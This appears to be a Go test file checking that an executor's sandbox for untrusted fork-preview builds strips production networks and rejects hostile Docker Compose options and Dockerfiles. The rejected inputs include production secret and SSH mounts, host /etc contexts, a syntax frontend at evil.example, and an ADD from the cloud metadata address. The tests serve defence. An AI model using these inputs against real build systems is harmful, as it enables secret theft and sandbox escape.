package executor

import (
	"encoding/json"
	sdkclient "github.com/imprezahost/impreza-devkit/sdk-go/client"
	"gopkg.in/yaml.v3"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Decode the real wire shape: the old agent silently ignores fork_preview.
func TestForkSandboxWireIsolation(t *testing.T) {
	var spec sdkclient.SandboxSpec
	if err := json.Unmarshal([]byte(`{"max_lifetime_minutes":30,"fork_preview":true}`), &spec); err != nil {
		t.Fatal(err)
	}
	input := `services:
  web:
    build:
      context: ./build-ctx
      dockerfile: Dockerfile
    networks: [impreza-proxy]
networks:
  impreza-proxy:
    external: true
`
	result, err := applySandbox(input, "dpl_aaaa111122223333", spec)
	if err != nil {
		t.Fatal(err)
	}
	var doc map[string]any
	if err := yaml.Unmarshal([]byte(result), &doc); err != nil {
		t.Fatal(err)
	}
	svc := doc["services"].(map[string]any)["web"].(map[string]any)
	build := svc["build"].(map[string]any)
	if build["network"] != "none" {
		t.Fatal("untrusted build still has network access")
	}
	nets := svc["networks"].([]any)
	if len(nets) != 1 || nets[0] != "fork-internal" {
		t.Fatal("untrusted runtime can join production networks")
	}
	if strings.Contains(result, "impreza-proxy") {
		t.Fatal("production network retained")
	}
	dns := svc["dns"].([]any)
	if len(dns) != 1 || dns[0] != "127.0.0.1" {
		t.Fatal("host DNS relay retained")
	}
	for _, option := range []string{"secrets: [production]", "ssh: [default]", "entitlements: [network.host]", "additional_contexts: {host: /etc}", "extra_hosts: [host:host-gateway]", "args: {PRODUCTION_SECRET: leaked}", "args: [PRODUCTION_SECRET]"} {
		hostile := strings.Replace(input, "      context: ./build-ctx", "      "+option+"\n      context: ./build-ctx", 1)
		if _, err := applySandbox(hostile, "dpl_aaaa111122223333", spec); err == nil {
			t.Fatalf("fork build accepted %s", option)
		}
	}
	if _, err := applySandbox(strings.Replace(input, "    networks:", "    volumes: [production:/data]\n    networks:", 1), "dpl_aaaa111122223333", spec); err == nil {
		t.Fatal("fork accepted production volume")
	}
}

func TestForkDockerfileDeniesHostCredentialDestinations(t *testing.T) {
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "build-ctx"), 0700); err != nil {
		t.Fatal(err)
	}
	build := &sdkclient.BuildContext{DockerfilePath: "Dockerfile"}
	for _, text := range []string{"FROM busybox:1.37\nCOPY . /app\n", "FROM \\\n alpine:3.21 AS base\nFROM base\n", "FROM nginx:alpine\nCOPY --from=0 /etc/nginx /backup\n"} {
		if err := os.WriteFile(filepath.Join(dir, "build-ctx", "Dockerfile"), []byte(text), 0600); err != nil {
			t.Fatal(err)
		}
		if err := validateForkDockerfile(dir, build); err != nil {
			t.Fatalf("safe Dockerfile refused: %q: %v", text, err)
		}
	}
	for _, text := range []string{"# syntax=host.internal/private\nFROM busybox\n", "#\tsyntax = evil.example/frontend\nFROM busybox\n", "FROM host.internal/production\n", "FROM \\\n host.internal/production\n", "FROM alpine\nCOPY --from=host.internal/production / /dump\n", "FROM alpine\nVOLUME /production\n", "FROM alpine\nADD http://169.254.169.254/latest /metadata\n"} {
		if err := os.WriteFile(filepath.Join(dir, "build-ctx", "Dockerfile"), []byte(text), 0600); err != nil {
			t.Fatal(err)
		}
		if err := validateForkDockerfile(dir, build); err == nil {
			t.Fatalf("untrusted host destination accepted: %q", text)
		}
	}
}

// Legitimate non-fork sandbox builds keep their network and build arguments.
func TestNonForkSandboxWireCompatibility(t *testing.T) {
	var spec sdkclient.SandboxSpec
	if err := json.Unmarshal([]byte(`{"max_lifetime_minutes":30}`), &spec); err != nil {
		t.Fatal(err)
	}
	input := "services:\n  web:\n    build:\n      context: ./build-ctx\n      args: {PUBLIC_RELEASE: v1}\n    networks: [impreza-proxy]\nnetworks:\n  impreza-proxy:\n    external: true\n"
	result, err := applySandbox(input, "dpl_aaaa111122223333", spec)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(result, "impreza-proxy") || !strings.Contains(result, "PUBLIC_RELEASE") || strings.Contains(result, "fork-internal") {
		t.Fatal("legitimate non-fork build was restricted as hostile fork")
	}
}
